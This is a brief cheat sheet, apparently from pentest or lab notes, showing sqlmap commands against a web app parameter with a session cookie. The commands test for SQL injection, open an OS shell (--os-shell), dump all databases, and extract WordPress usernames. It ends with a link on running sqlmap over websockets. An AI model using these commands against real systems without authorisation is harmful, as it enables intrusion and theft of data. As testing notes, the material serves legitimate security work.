# SQL Map

Use sqlmap to test a URL parameter for SQLi vulnerability

```bash
# note that here we're providing a cookie too, reqd for auth in this case
sqlmap -u 'http://10.123.32.1/dashboard.php?search=dummyparam' --cookie="PHPSESSID=cbu4s4g076c6hvgn9tq2jn8a4t"
```

Use sqlmap to try and pop a shell on the host

```bash
sqlmap -u 'http://10.123.32.1/dashboard.php?search=dummyparam' --cookie="PHPSESSID=cbu4s4g076c6hvgn9tq2jn8a4t" --os-shell
```

Dump contents of db, excluding the sstem tables since they usually never change in a way that's meaningful to us

```bash
sqlmap -u 'http://10.123.32.1/dashboard.php?search=dummyparam' --cookie="PHPSESSID=cbu4s4g076c6hvgn9tq2jn8a4t" --dump-all --exclude-sysdbs
```

If there's no way of directly extracting data, this will be done using a UNION-SLEEP query to brute force every single value/string - will take a LONG TIME!

If we know the schema, we can speed things up by specifying the column, table and db names (column and table optional). e.g. to dump the usernames from a WordPress blog db -

```bash
sqlmap -u 'http://10.123.32.1/dashboard.php?search=dummyparam' --cookie="PHPSESSID=cbu4s4g076c6hvgn9tq2jn8a4t" --dump -C user_login -T wp_users -D blog
```

# SQLMap Over Websockets

This article talks through creating a lightweight proxy server to receive queries and pass them to sqlmap

https://francesco-pastore.medium.com/sqlmap-over-websockets-353cdcd9a7ab